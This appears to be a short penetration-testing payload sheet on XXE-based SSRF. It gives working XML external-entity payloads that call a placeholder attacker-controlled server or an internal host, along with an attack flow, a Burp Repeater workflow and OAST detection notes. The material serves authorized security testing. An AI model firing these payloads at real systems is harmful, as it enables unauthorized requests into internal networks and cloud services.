# Payload 02 – XXE SSRF

## Purpose

Test whether an external entity can cause the vulnerable server to make a request to a URL.

---

## Basic Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://YOUR-CONTROLLED-SERVER">
]>
<foo>
    &xxe;
</foo>
```

---

## Internal Resource

For an authorized lab or target, the external entity can reference an internal resource:

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://INTERNAL-HOST/RESOURCE">
]>
```

---

## Attack Flow

```text
Attacker
   ↓
Malicious XML
   ↓
External Entity
   ↓
URL
   ↓
Vulnerable Server
   ↓
Target Resource
```

---

## Detection

Use a controlled server or OAST service to determine whether the vulnerable application makes the request.

---

## Burp Workflow

```text
Intercept XML request
        ↓
Send to Repeater
        ↓
Insert external entity
        ↓
Reference entity
        ↓
Send
        ↓
Monitor interaction
```

---

## Impact

Potential impact depends on what the vulnerable server can reach.

Possible targets include:

```text
Internal APIs
Internal applications
Cloud services
Network resources
```

---

## Important

A successful SSRF test demonstrates server-side network interaction. It does not automatically imply access to every internal resource.